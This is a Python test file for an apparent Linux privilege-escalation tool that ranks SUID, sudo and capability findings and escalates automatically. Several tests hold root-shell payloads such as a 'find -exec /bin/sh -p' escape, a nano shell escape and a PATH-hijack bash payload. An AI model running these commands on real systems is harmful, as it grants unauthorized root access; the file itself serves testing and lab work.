from unittest.mock import patch

from binsuid.analysis.ranking import ranked_exploitable
from binsuid.cli import escalation_loop
from binsuid.exploit.builtin import builtin_techniques_for
from binsuid.exploit.executor import adapt_command
from binsuid.exploit.path_hijack import path_hijack_payload
from binsuid.exploit.selector import attach_best_techniques
from binsuid.models import Finding, ScanResult, Technique, VectorType
from binsuid.scanner.process_caps import scan_process_capabilities
from binsuid.scanner.sudo_scan import _parse_sudo_l
from binsuid.utils import decode_cap_eff_hex


def _exploitable(path: str, vector: VectorType = VectorType.SUID, **kwargs) -> Finding:
    finding = Finding(
        vector=vector,
        path=path,
        executable=path.rsplit("/", 1)[-1],
        **kwargs,
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    return finding


def test_ranked_exploitable_prefers_custom_suid_over_known():
    custom = _exploitable("/usr/local/bin/find")
    known = Finding(
        vector=VectorType.SUID,
        path="/usr/bin/passwd",
        executable="passwd",
        details="known-suid",
        best_technique=Technique(
            executable="passwd",
            function="shell",
            code="/usr/bin/passwd",
            context="suid",
            metadata={"source": "builtin", "auto": True},
        ),
    )
    ranked = ranked_exploitable([known, custom])
    assert ranked[0] is custom


def test_escalation_loop_auto_uses_best_candidate():
    custom = _exploitable("/usr/local/bin/find")
    known = Finding(
        vector=VectorType.SUID,
        path="/usr/bin/find",
        executable="find",
        best_technique=Technique(
            executable="find",
            function="shell",
            code="/usr/bin/find . -exec /bin/sh -p \\; -quit",
            context="suid",
            metadata={"source": "builtin", "auto": True},
        ),
    )
    result = ScanResult(findings=[known, custom])

    with patch("binsuid.cli.print_vulnerable_targets"):
        with patch("binsuid.cli.prompt_target_choice", return_value="auto"):
            with patch("binsuid.cli.escalate_privileges") as escalate:
                escalate.return_value = 0
                assert escalation_loop(result, assume_yes=True) == 0
                escalate.assert_called_once()
                assert escalate.call_args.args[0] is custom


def test_decode_cap_eff_hex_setuid_bit():
  # CAP_SETUID is bit 7 -> 0x80
    assert "CAP_SETUID" in decode_cap_eff_hex("0000000000000080")


def test_process_caps_without_capsh_uses_hex_decoder():
    status = (
        "Name:\ttestproc\n"
        "CapEff:\t0000000000000080\n"
    )
    with patch("binsuid.scanner.process_caps.os.listdir", return_value=["1234"]):
        with patch("binsuid.scanner.process_caps.os.path.isfile", return_value=True):
            with patch("binsuid.scanner.process_caps.os.path.isdir", return_value=True):
                with patch("binsuid.scanner.process_caps.which", return_value=None):
                    with patch("builtins.open", create=True) as mock_open:
                        mock_open.return_value.__enter__.return_value.read.return_value = status
                        with patch(
                            "binsuid.scanner.process_caps._resolve_proc_exe",
                            return_value="/usr/bin/python3",
                        ):
                            findings, _ = scan_process_capabilities()
    assert findings
    assert "CAP_SETUID" in findings[0].capabilities


def test_sudo_parse_normalizes_bare_binary_path():
    sample = """
User student may run the following commands on lab:
    (root) NOPASSWD: find
"""
    findings = _parse_sudo_l(sample)
    assert findings[0].path == "/usr/bin/find"


def test_nano_suid_payload_does_not_use_nano_p_flag():
    finding = Finding(
        vector=VectorType.SUID,
        path="/usr/bin/nano",
        executable="nano",
    )
    payload = builtin_techniques_for(finding)[0].code
    assert payload == "/usr/bin/nano -s /bin/sh"
    assert "-s /bin/sh -p" not in payload


def test_sgid_path_hijack_payload_skips_preserve_privileges():
    code = path_hijack_payload(
        suid_path="/usr/local/bin/shared",
        command="tar",
        preserve_privileges=False,
    )
    assert "exec /bin/bash\\n" in code
    assert "exec /bin/bash -p" not in code


def test_adapt_command_resolves_sudo_bare_executable():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/find",
        executable="find",
        details="cmd=find; runas=root; nopasswd=True; setenv=False; user=student",
    )
    with patch("binsuid.exploit.executor.current_ids", return_value=(1000, 1000, 1000, 1000)):
        with patch("binsuid.exploit.executor.get_shadow_gid", return_value=42):
            command = adapt_command("find . -exec /bin/sh \\; -quit", finding)
    assert command.startswith("sudo -n /usr/bin/find")
